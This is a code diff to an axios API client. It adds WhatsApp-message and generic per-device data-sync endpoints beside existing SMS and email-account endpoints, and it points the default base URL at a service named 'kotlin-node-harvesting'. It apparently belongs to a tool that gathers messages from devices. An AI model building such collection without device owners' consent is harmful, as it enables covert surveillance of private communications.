@@ -1,10 +1,10 @@
 import axios from 'axios';
 
-const API_BASE_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3000';
+const API_BASE_URL = process.env.NEXT_PUBLIC_API_URL || 'https://kotlin-node-harvesting.onrender.com';
 
 const api = axios.create({
   baseURL: `${API_BASE_URL}/api`,
-  timeout: 10000,
+  timeout: 30000,
   headers: {
     'Content-Type': 'application/json',
   },
@@ -31,6 +31,12 @@ api.interceptors.response.use(
     return Promise.reject(error);
   }
 );
+
+// Health Check API
+export const healthAPI = {
+  check: () => api.get('/health'),
+  getStats: () => api.get('/health')
+};
 
 // Device API
 export const deviceAPI = {
@@ -71,7 +77,6 @@ export const messagesAPI = {
   sync: (deviceId, messages) => api.post('/messages/sync', { deviceId, messages }),
   getAll: (deviceId, params = {}) => api.get(`/messages/${deviceId}`, { params }),
   getStats: (deviceId) => api.get(`/messages/${deviceId}/stats`),
-
   delete: (deviceId, messageId, type) => api.delete(`/messages/${deviceId}/${messageId}/${type}`)
 };
 
@@ -82,6 +87,21 @@ export const emailAccountsAPI = {
   getByAddress: (deviceId, emailAddress) => api.get(`/email-accounts/${deviceId}/${encodeURIComponent(emailAddress)}`),
   updateStatus: (deviceId, emailAddress, isActive) => api.patch(`/email-accounts/${deviceId}/${encodeURIComponent(emailAddress)}/status`, { isActive }),
   delete: (deviceId, emailAddress) => api.delete(`/email-accounts/${deviceId}/${encodeURIComponent(emailAddress)}`)
+};
+
+// WhatsApp API
+export const whatsappAPI = {
+  sync: (deviceId, messages) => api.post('/whatsapp/sync', { deviceId, messages }),
+  getAll: (deviceId, params = {}) => api.get(`/whatsapp/${deviceId}`, { params }),
+  getStats: (deviceId) => api.get(`/whatsapp/${deviceId}/stats`),
+  delete: (deviceId, messageId) => api.delete(`/whatsapp/${deviceId}/${messageId}`)
+};
+
+// Data Sync API
+export const syncAPI = {
+  syncData: (deviceId, dataType, data) => api.post(`/devices/${deviceId}/sync`, { dataType, data }),
+  getSyncedData: (deviceId, dataType) => api.get(`/devices/${deviceId}/synced-data/${dataType}`),
+  getSyncStats: (deviceId) => api.get(`/devices/${deviceId}/sync-stats`)
 };
 
 export default api;
